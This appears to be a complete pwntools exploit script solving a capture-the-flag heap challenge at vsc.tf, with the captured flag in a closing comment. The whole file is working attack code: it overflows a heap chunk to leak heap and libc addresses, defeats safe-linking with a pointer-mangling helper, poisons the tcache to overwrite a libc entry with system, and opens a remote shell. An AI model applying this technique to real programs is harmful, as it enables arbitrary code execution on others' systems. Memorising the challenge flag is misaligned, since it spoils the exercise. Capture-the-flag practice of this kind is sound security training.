#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF(args.EXE or '', checksec=True)
libc = exe.libc
# context.terminal = ["terminator", "-u", "-e"]
context.terminal = ["remotinator", "vsplit", "-x"]

gdbscript = '''
# b edit
continue
'''

pre_argv = []
post_argv = []

def get_conn(pre_argv=[], post_argv=[], gdbscript="", *a, **kw):
    host = args.HOST or 'vsc.tf'
    port = int(args.PORT or 7001)
    gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
    exe_name = os.path.basename(exe.path)
    cmd = pre_argv + [exe.path] + post_argv

    if args.DOCKER:
        if args.REMOTE:
            p = remote(host, port, *a, **kw)
        else:
            p = process(f'docker run -i --rm {args.DOCKER}', shell=True)
        if args.GDB:
            sleep(1) # TODO: find better method
            gdb.attach(pidof(exe_name)[0], gdbscript=gdbscript, exe=exe.path, *a, **kw)
        return p
    if args.GDB:
        return gdb.debug(cmd, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(host, port, *a, **kw)

    return process(cmd, *a, **kw)

io = get_conn(pre_argv, post_argv, gdbscript)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
def protect_ptr(pos, ptr): return (pos >> 12) ^ ptr

def create(idx, size):
    sla(b'choice: ', b'1')
    sla(b'index: ', str(idx).encode())
    sla(b'size: ', str(size).encode())
    return idx

def edit(idx, data):
    sla(b'choice: ', b'2')
    sla(b'index: ', str(idx).encode())
    sla(b'data: ', data)

def print(idx):
    sla(b'choice: ', b'3')
    sla(b'index: ', str(idx).encode())
    ru(b'Data: ')
    return rl()

def delete(idx):
    sla(b'choice: ', b'4')
    sla(b'index: ', str(idx).encode())
    

def expansion(idx, size):
    sla(b'choice: ', b'260')
    sla(b'index: ', str(idx).encode())
    sla(b'size: ', str(size).encode())



maniek = create(0, 0x20)
victim1 = create(1, 0x20)
unsorted = create(2, 0x500) # unsorted
create(3, 0x20) # prevent consolidation

delete(unsorted)
delete(victim1)

create(5, 0x100)
create(5+1, 0x100)
create(5+2, 0x100)
create(5+3, 0x100)

expansion(maniek, 0x1000)
edit(maniek, b'A'*0x30)

heap_leak = print(maniek)
heap_leak = heap_leak.removeprefix(b'Data: ')[0x30:] # skip A
heap_leak = heap_leak[:heap_leak.index(b'\n')]
heap_leak = u64(heap_leak.ljust(8, b'\x00'))
info(f'heap_leak {heap_leak:#x}')

heap_base = heap_leak << 12
info(f'heap_base {heap_base:#x}')

edit(maniek, b'A'*0x60)
libc_leak = print(maniek)
libc_leak = libc_leak.removeprefix(b'Data: ')[0x60:] # skip A
libc_leak = libc_leak[:libc_leak.index(b'\n')]
libc_leak = u64(libc_leak.ljust(8, b'\x00'))
info(f'libc_leak {libc_leak:#x}')

libc.address = libc_leak - 0x21b110

victim1 = create(1, 0x40)
victim2 = create(4, 0x40)
create(9, 0x20) # prevent consolidation

delete(victim2)
delete(victim1)

target = libc.address + 0x21a000 + 0x88 - 0x8
edit(maniek, flat(
    b'A'*0x4a0,
    protect_ptr(heap_base + 0x740, target)
))

create(11, 0x40)
edit(maniek, b'/bin/sh\x00')

winner = create(12, 0x40)

edit(winner, flat(
    b'A' * 0x18,
    libc.sym.system
))

print(maniek)

ia()

# $ cat flag.txt
# vsctf{thr0ugh0ut_h34v3n_4nd_34rth_1_4l0n3_4m_th3_h0n0r3d_0n3}
